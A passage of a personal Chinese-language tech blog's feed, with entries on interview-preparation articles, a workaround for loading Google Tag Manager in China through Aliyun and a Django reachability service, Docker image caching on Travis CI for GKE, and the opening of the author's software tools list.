&lt;p&gt;在 2017/12/28 下午到 ZyXEL 代理商展碁國際在台北的據點換貨之後，一回去馬上先把韌體升級到最新版才開始使用，目前使用到今天大概兩個多禮拜都還正常，如果之後又遇到問題的話會再更新在這篇文章，畢竟有遇到有人是用了超過一個月才出問題的。  &lt;/p&gt;</summary><category term="ZyXEL"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>整理一些跟面試相關的文章</title><link href="https://blog.m157q.tw/posts/2018/01/12/articles-related-to-interview/" rel="alternate"></link><published>2018-01-12T22:50:58+08:00</published><updated>2018-01-12T22:50:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-12:posts/2018/01/12/articles-related-to-interview/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2015 年底開始找正職工作的時候，就覺得自己對面試這件事實在不拿手，也沒有什麼信心。畢竟學校也沒教，然後自己之前在學校裏面做些跟寫程式相關的工作也都不算有太嚴格的面試，大多都是認識的人問我有沒有興趣就做了。  &lt;/p&gt;
&lt;p&gt;當時唯二兩個有面試的工作裡頭，其中一個是要處理網路設備相關的工作，問了我 C/C++ 的問題，我當時啥都沒準備，答得超爛，就不了了之。另外一個則是系上計算機中心的助教，但這嚴格說起來不算是很難的面試，因為考試內容基本上就是上學期學的計算機系統管理，以及下學期學的計算機網路管理。我在這兩門課都拿到不錯的分數，沒記錯的話應該是 97 和 99 吧 ，因為學得很有興趣，就被問問有沒有興趣當助教。所以考試的題目基本上都是學過的東西，面試官也都是修課時看了一年的助教，沒有什麼太強烈的緊張感。  &lt;/p&gt;
&lt;p&gt;2016 年 1 月 21 日，人生第 1 份 出社會的工作正式上工以後，一直到 2017 年 12 月 1 日正式離職，在這期間雖然沒有參加任何面試，但也看到了滿多不錯的面試文章。大概在 2016 年 9 月左右，開始覺得自己好像應該把這些不錯的面試文章蒐集起來，並紀錄一下自己當時看完的心得，以供自己日後面試時可以參考複習。往後期間都只有簡短紀錄在 Trello 中，一直沒有花時間整理成一篇文章。剛好利用這段離職後比較閒暇的時間來好好整理一下，後續會紀錄在 &lt;a href="https://github.com/M157q/m157q.github.io/issues?q=is%3Aopen+is%3Aissue+label%3Ainterview"&gt;Issues · M157q/m157q.github.io · GitHub&lt;/a&gt;，如果沒忘記的話也會更新在這篇文章就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;內文&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2015/12/31/dev-job-talk/"&gt;研发招聘之殇 - 后端技术杂谈 | 飒然Hang&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是作者面試許多人後給出的意見，我覺得滿中肯的。  &lt;/li&gt;
&lt;li&gt;因為有面試剛畢業的學生，所以也有點出了中國那邊學生的狀況，基本上跟台灣這邊提到的差不多：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术脱离业界前沿  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;基础素质欠缺  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;没有畏惧心  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知其然不知其所以然  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提出了中國那邊常見的面試型態：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;N轮算法题目面试  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;掺杂计算机基础知识、算法以及项目经验的面试  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件设计  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;现场结对编程/ppt讲解  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只看学历、学校。这种面试方式  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;群面  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;也提出了自己對於優秀的工程師或技術人員所預期的特質：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;聪明、思维灵活  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对技术有热情  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;基础知识扎实  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有执行力  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1473255742.A.ED5.html"&gt;[心得] 台北多家面試心得 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個主要是夠多家（18 間），而且有不少算有一點名氣的新創公司的資訊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://thecodist.com/article/phone-interviews-can-be-so-painful-to-do"&gt;The Codist: Phone Interviews Can Be So Painful To Do&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是在講作者透過 Phone interview 面試人的經驗。  &lt;/li&gt;
&lt;li&gt;怨念超深，作者目前是迪士尼公司的 Lead iOS engineer，抱怨一堆來面試的人連一些很基本的問題都答不出來。  &lt;/li&gt;
&lt;li&gt;可以拿來引以為戒。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Tech_Job/M.1473663935.A.177.html"&gt;[面試] 研替心得分享及請益-下 (晨星) - 看板 Tech_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是竹科的公司普遍的面試流程。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E9%97%9C%E6%96%BC%E8%BE%AD%E8%81%B7-%E8%BD%89%E8%A1%8C-%E6%80%9D%E8%80%83-%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB-c8c26319d25b"&gt;關於辭職、轉行、思考｜文章分享 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇嚴格說起來不太算面試相關，不過我覺得跟思考自己的職涯有關，所以其實也滿適合整理在這的。  &lt;/li&gt;
&lt;li&gt;作者整理了滿多相關的文章，很適合給我這種離職完後的人好好想想，提到了一些我沒有想到的觀點或面向。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/hulis-blog/interview-prepare-b815d938f0de"&gt;面試問答準備心得之考前猜題 – Huli’s blog – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇真的整理的很完整，基本上把面試會提到的問題大概都列出來了。  &lt;/li&gt;
&lt;li&gt;很適合在面試前，自己花時間把這些都好好在腦中演練一下，我覺得會滿有幫助的。  &lt;/li&gt;
&lt;li&gt;如果能用英文演練的話更好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/hulis-blog/stripe-and-i-df35a6f0a799"&gt;我與 Stripe ：一段愛與夢想的故事 – Huli’s blog – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者過了好幾關，而且把細節描述的非常詳細，過程中也瞭解到：真的很喜歡一間公司的話到底會為面試準備到什麼程度  &lt;/li&gt;
&lt;li&gt;自己可以拿來好好學習一下&amp;lt;但想不到最後竟然是因為聯絡延宕過久而去了另一間公司，現實生活中的事情總是這樣充滿變數和難以預料啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@Doppler/2017-front-end-%E5%8F%8A-ui-designer-%E9%9D%A2%E8%A9%A6%E7%B4%80%E9%8C%84-bdef59188916"&gt;2017 Front-End 及 UI Designer 面試紀錄 – Doppler Kuo – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也紀錄的很詳細，雖然我自己應該是不會面試 Web Front-End 和 UI Designer 相關的工作，但還是很值得參考。  &lt;/li&gt;
&lt;li&gt;面試了 15 間公司，大多數都是偏叫得出名字的新創，但也有大公司。  &lt;/li&gt;
&lt;li&gt;雖然結果好像沒有很亮眼，但每次看到這種面試了很多間的我還是會挺敬佩的就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://crossing.cw.com.tw/blogTopic.action?id=568&amp;amp;nid=8891"&gt;「最後，你有沒有問題想問我們？」──跨國企業面試官，教你7大面試提問法 ｜ 何則文／香蕉夢想家 ｜ 換日線 Crossing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;滿實用的一篇文章，以前面試完被問到這個都有點不太知道要問什麼，剛好近期又要開始面試了，可以好好想一下裏面的問題。  &lt;/li&gt;
&lt;li&gt;不過感覺這篇比較偏向外商的公司可以問的，像底下還是有人提到以前有問過一樣的問題，但因為被面試官覺得太直接而被迴避掉或被直接反問的。但剛好之後的目標應該主要也是鎖定國外的公司，所以應該遇到這個狀況的可能性會比較低一點。  &lt;/li&gt;
&lt;li&gt;這邊節錄一下 7 個問題：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一、「請問這個職缺是怎麼產生的？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;二、「您喜歡這家公司嗎？為什麼？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三、「就我的理解，公司目前在業界的情況、主要競爭對手，我的理解是不是正確的？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;四、「您認為公司在業界中，最大的競爭優勢是什麼？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;五、「您認為這個職缺需要的核心能力是什麼？希望具備什麼特質？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;六、「如果我最後沒能進入貴公司，最大的因素是？您認為我哪方面需要再加強？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;七、「詢問姓名、職稱與聯絡方式」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;剛好在上一份工作離職前，得到了第一次面試別人的機會，面試完後的感想紀錄在此：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;面試時不要不懂裝懂，真的會讓懂得人不知道該擺出甚麼表情。  &lt;/li&gt;
&lt;li&gt;講不知道後再根據自己已知的事物聯想提問，跟一知半解得胡亂猜測單純找話講，觀感天差地遠。  &lt;/li&gt;
&lt;li&gt;上禮拜面試人的感想，近期自己可能也要去面試，順便用來自省。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Interview"></category><category term="Job"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>中國網路相關筆記</title><link href="https://blog.m157q.tw/posts/2018/01/11/dealing-with-china-network/" rel="alternate"></link><published>2018-01-11T16:00:26+08:00</published><updated>2018-01-11T16:00:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-11:posts/2018/01/11/dealing-with-china-network/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2016 年 8 月緊急接到要支援客戶在中國的服務，但我們現有的 infrastructure 都是在台灣，又不可能在短時間內全部搬到中國的雲服務商那，所以就用上了各種 workaround，最後算是得到了一個還可以接受的結果，雖然不盡理想就是。  &lt;/p&gt;
&lt;p&gt;當時實在是忙到沒啥時間紀錄，最近比較有空了，用這篇文章留個紀錄一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;一些可以用來輔助的網站&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.greatfire.org/analyzer"&gt;https://en.greatfire.org/analyzer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;TEST URL 可以讓你檢查某個網址在中國是不是被禁止的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.17ce.com/"&gt;https://www.17ce.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來檢查中國大部份地區以及少數國外地區連到某個網站的狀況  &lt;/li&gt;
&lt;li&gt;我後來有寫個爬蟲專門爬這網站的結果，每個小時去檢查連到某個網址的狀況。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ping.chinaz.com/"&gt;http://ping.chinaz.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來檢查中國大部份地區以及少數國外地區連到某個網站的狀況  &lt;/li&gt;
&lt;li&gt;我後來有寫個爬蟲專門爬這網站的結果，每個小時去檢查連到某個網址的狀況。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.speedtest.cn/"&gt;http://www.speedtest.cn/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國的 SpeedTest  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.webkaka.com/"&gt;http://www.webkaka.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一樣是中國大部份地區連到某個網址的狀況，但伺服器的站點數量沒有很多，有些省分沒有。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tools.cloudxns.net/"&gt;http://tools.cloudxns.net/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有一系列的工具可以使用，主要都是跟 DNS 比較相關。  &lt;/li&gt;
&lt;li&gt;當時是用來查合作伙伴的伺服器到底有沒有指到中國內的伺服器用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.hidemyass.com/proxy"&gt;https://www.hidemyass.com/proxy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;免費的 web proxy，當時用來檢測中國國內某個地方是否可以成功存取我們的資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm"&gt;https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;免費的 chrome plugin，當時用來檢測中國國內某個地方是否可以成功存取我們的資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gdaily.org/8170/free-proxy-google-china-japan-usa"&gt;https://www.gdaily.org/8170/free-proxy-google-china-japan-usa&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;整理了一些免費的 proxy 資源，主要是 proxy 到牆內用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://proxy.moo.jp/zh/?c=CN&amp;amp;pt=&amp;amp;pr=&amp;amp;a%5B%5D=0&amp;amp;a%5B%5D=1&amp;amp;a%5B%5D=2&amp;amp;u=0"&gt;http://proxy.moo.jp/zh/?c=CN&amp;amp;pt=&amp;amp;pr=&amp;amp;a%5B%5D=0&amp;amp;a%5B%5D=1&amp;amp;a%5B%5D=2&amp;amp;u=0&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;列出了有哪些免費的 proxy 位址可供使用。  &lt;/li&gt;
&lt;li&gt;但很常變動，常常要換就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ipcn.chacuo.net/"&gt;http://ipcn.chacuo.net/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;列出中國 IP 對應到哪個電信商及省分的列表  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;當然使用免費的 proxy 就要記得不要在網站上輸入啥私密資料了，畢竟很有可能會被錄封包。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;狀況&lt;/h2&gt;
&lt;p&gt;因為現有的服務使用 Google Cloud Platform，伺服器在美國，客戶在中國的網站直接嵌入我們原本提供的 JavaScript 會被中國的防火長城擋掉，導致客戶的網站上看到錯誤，或是要等很久才能載入，等於現有的服務無法提供使用。除了短時間內無法搬到中國的雲服務商上面以外，老闆也不太希望這麼做，一方面是時間上的壓力，一方面是費用的問題，所以還是希望能夠儘量用現有的服務，如果不能全部搬過去也沒差，只要有辦法得到的一個能接受的結果就好。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;歷程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;因為連不到放在美國伺服器上的 JavaScript，所以得把目前在用的 JavaScript 放一份到中國雲服務商上，最好還要有 CDN。  &lt;ul&gt;
&lt;li&gt;原本有想說要比較中國各服務商例如：青雲、阿里雲、騰訊雲等等，哪些比較好用。但後來因為公司以前有陣子有用阿里雲的服務，所以有帳號，加上時間很趕，所以就直接使用阿里雲了。  &lt;/li&gt;
&lt;li&gt;把公司自己的 JavaScript 複製到阿里雲上之後，可以成功連到了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但使用的 Google Tag Manager 要載入的 gtm.js 在有些狀況仍然連不到，但有時候卻連得到。  &lt;ul&gt;
&lt;li&gt;這部份除非不用 Google Tag Manager，不然基本上沒有什麼太好的解法。  &lt;/li&gt;
&lt;li&gt;遇到的時候有去找中國有沒有類似 Google Tag Manager 的服務，但找不太到。  &lt;/li&gt;
&lt;li&gt;加上公司使用 Google Tag Manager 有弄出自己的一套架構，所以要搬也沒那麼好搬。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;就想說能不能幫 gtm.js 弄個 proxy。  &lt;ul&gt;
&lt;li&gt;有找到這個：&lt;a href="http://www.ajax-cross-origin.com/"&gt;Ajax Cross Origin - jQuery plugin&lt;/a&gt;，實際也有架起來。  &lt;/li&gt;
&lt;li&gt;但後來才想到這樣根本行不通，因為 gtm.js 會紀錄使用者的行為，架了一個 proxy 的話就會被擋住。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;到此已經放棄讓所有使用者都載入 gtm.js 了，轉而變成「讓可以載入的使用者載入，無法載入的就不要載入，而且不能顯示有錯誤。」因為客戶要求不能在連到他們的網站時在瀏覽器的 console 中看到任何錯誤。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;於是轉而想說能不能做到「如果嘗試載入 JavaScript 一段時間後不成功的話就停止載入。」  &lt;ul&gt;
&lt;li&gt;有找到 StackOverflow 上的這篇： &lt;a href="https://stackoverflow.com/questions/5642270/load-a-javascript-file-but-cancel-if-it-takes-too-long"&gt;browser - Load a Javascript file, but cancel if it takes too long? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;試了一下發現無法成功。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後自己想出了一個折衷的辦法，但非常的土炮。  &lt;ul&gt;
&lt;li&gt;我在阿里雲上開了台虛擬機，用 Django 架了個伺服器。  &lt;/li&gt;
&lt;li&gt;寫了個 crawler 每小時固定去爬上面提到的 &lt;a href="https://www.17ce.com/"&gt;https://www.17ce.com/&lt;/a&gt; 和 &lt;a href="http://ping.chinaz.com/"&gt;http://ping.chinaz.com/&lt;/a&gt; ，把他們有沒有辦法載入 gtm.js 的結果紀錄起來。  &lt;ul&gt;
&lt;li&gt;其結果會包含省分、電信商及其能不能載入。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;另外一個 crawler 則是去爬 &lt;a href="http://ipcn.chacuo.net/"&gt;http://ipcn.chacuo.net/&lt;/a&gt;，把所有 IP 對應到的省分和電信商紀錄下來，每天會更新一次。  &lt;/li&gt;
&lt;li&gt;最後在使用者瀏覽客戶的網站要嘗試載入 gtm.js 之前，會先去問我用 Django 架起來的伺服器，會把使用者的 IP 當參數送過來。  &lt;/li&gt;
&lt;li&gt;伺服器收到使用者的 IP 後，先去拿到其所屬的省分和電信商，再去檢查最近一個小時的結果是否能夠載入，如果可以載入的話，API 就會回傳 true 回去，不行的話就回傳 false，當然都是包成 JSON 回傳回去。  &lt;/li&gt;
&lt;li&gt;伺服器同時也會把來詢問的結果紀錄到資料庫裡頭，以供日後查詢統計用。最後發現平均能夠載入載入的比例大概是四成左右而已，雖然少的可憐，但至少是可以接受的結果。  &lt;/li&gt;
&lt;li&gt;是說這個 Django 專案也算是我第一個完全自己獨力完成的，也學到了不少東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;最後整件事情弄完的結論就是：如果原本沒有做中國的服務然後哪天要做中國的服務的話，絕對不要堅持用現有的服務來用，除非確定完全可以動。不然就會出現各種奇怪的狀況，需要各種不同的 workaround 來解，真的會很累。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ajax-cross-origin.com/install.html"&gt;Ajax Cross Origin - jQuery plugin&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://webmasters.stackexchange.com/questions/81878/google-tag-manager-blocked-in-china"&gt;Google Tag Manager blocked in China..? - Webmasters Stack Exchange&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/5642270/load-a-javascript-file-but-cancel-if-it-takes-too-long"&gt;browser - Load a Javascript file, but cancel if it takes too long? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="China"></category><category term="Network"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Docker + Travis CI + Kubernetes + GKE</title><link href="https://blog.m157q.tw/posts/2018/01/10/docker-travis-ci-kubernetes-gke/" rel="alternate"></link><published>2018-01-11T17:01:19+08:00</published><updated>2018-01-11T17:01:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-10:posts/2018/01/10/docker-travis-ci-kubernetes-gke/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇是 2016 年 6 月時的紀錄，當時剛接觸 Docker 和 Kubernetes 4 個月左右，在把舊的服務根據性質拆分成 3 個不同的 mircro serverices，想要做到讓 Travis CI 在跑完測試後，自動 build Docker image，再把 image 丟到 Google Cloud Platform 上，讓 GKE 使用。  &lt;/p&gt;
&lt;p&gt;當時還沒有 Google Cloud Builder 可以使用，所以在找尋解法的時候看到果然有人已經這麼做了。以下就來紀錄一下方法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;概要&lt;/h2&gt;
&lt;p&gt;學 Kubernetes 的時候找到了這簡短的文章：&lt;a href="https://chengl.com/orchestrating-docker-with-kubernetes/"&gt;Orchestrating Docker with Kubernetes&lt;/a&gt;，覺得可以讓剛上手的人快速瞭解。  &lt;/p&gt;
&lt;p&gt;至於透過 Travis CI 自動 build image  的部份，照著這篇文章做的確有成功：&lt;a href="https://chengl.com/docker-workflow/"&gt;Docker Workflow&lt;/a&gt;（其實看這篇文章的 &lt;code&gt;.travis.yml&lt;/code&gt; 就可以瞭解整個梗概了），但發現效果不盡理想，儘管已經拆分成 base image 和 production image，在每次 build image 的時候節省掉 build base image 的時間了，但花的時間還是太久。  &lt;/p&gt;
&lt;p&gt;當時因為被抓去做其他事，這部份就只弄到這裡，我覺得滿可惜的，後來大家都還是在 local build image 然後再透過 Makefile 把指令包裝起來，在 local 這邊透過 kubectl 把 image push 到 GCP。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後續&lt;/h2&gt;
&lt;p&gt;當時過了幾個月後，在 2016 年 9 月看到這篇文章：&lt;a href="https://blog.wu-boy.com/2016/09/docker-cache-on-travis/"&gt;在 Travis 實現 Docker Cache | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;，才發現原來有這樣的解法可以用。  &lt;/p&gt;
&lt;p&gt;後來發現也有很多人遇到一樣的問題，後來也大多是用 &lt;code&gt;docker save&lt;/code&gt;, &lt;code&gt;docker load&lt;/code&gt; 解決:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://giorgos.sealabs.net/docker-cache-on-travis-and-docker-112.html"&gt;Docker cache on Travis and Docker 1.12 // Read at G's // A personal blog from Giorgos Logiotatidis.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/travis-ci/travis-ci/issues/5358"&gt;Caching Docker Images on Build · Issue #5358 · travis-ci/travis-ci · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://atodorov.org/blog/2017/08/07/faster-travis-ci-tests-with-docker-cache/"&gt;Faster Travis CI tests with Docker cache&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/35305492/cache-docker-images-on-travis-ci"&gt;performance - Cache docker images on Travis CI - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chengl.com/orchestrating-docker-with-kubernetes/"&gt;Orchestrating Docker with Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://chengl.com/docker-workflow/"&gt;Docker Workflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/09/docker-cache-on-travis/"&gt;在 Travis 實現 Docker Cache | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="Kubernetes"></category><category term="Travis CI"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>我平常在電腦上用了哪些程式</title><link href="https://blog.m157q.tw/posts/2018/01/09/tools-i-use/" rel="alternate"></link><published>2018-01-26T03:26:55+08:00</published><updated>2018-01-26T03:26:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-09:posts/2018/01/09/tools-i-use/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;身為一個懶人，不喜歡做重複的事情，所以愛寫程式來把重複的事情解決掉，也因為這樣，所以很常用一些工具來幫助自己節省時間，以提高自己的生產力。  &lt;/p&gt;
&lt;p&gt;想說利用待業這段比較有空的時間，拿這篇文章來詳細紀錄一下自己目前到底用了哪些工具，留個紀錄，之後也可以用來追蹤比較，看看自己之後換了工具的原因，以及是不是真的有比較好。也有可能會變成歷史文，見證什麼時代的眼淚之類的吧（？）  &lt;/p&gt;
&lt;p&gt;身為一個寫程式的阿宅，平常都是用電腦居多，所以這篇只會以電腦用到的部份為主。格式分類參考自一年多前看到的這篇文章：&lt;a href="https://medium.com/hungys-blog/my-software-stack-2a406c1c57c1"&gt;My Software Stack – Hungys.blog() – Medium&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;OS &amp;amp; VM &amp;amp; VPS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從 2012 年用到現在，算一算也有個 5~6 年了，真的覺得是個很棒的作業系統。（在這之前是使用 Ubuntu。）  &lt;/li&gt;
&lt;li&gt;預設乾乾淨淨，想要裝什麼都自己決定，可以用 pre-compiled package 也可以自己編譯，自訂性挺高的。  &lt;/li&gt;
&lt;li&gt;最棒的還是 Rolling Update 的特性，遇到一些安全性的更新都可以馬上更新，雖然剛開始用的時候會遇到升上去就爛掉的問題，但這幾年已經很少遇到了。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/"&gt;2015 年 9 月後，直接把 Arch Linux 安裝在 MacBook Air Mid 2013 上使用。&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
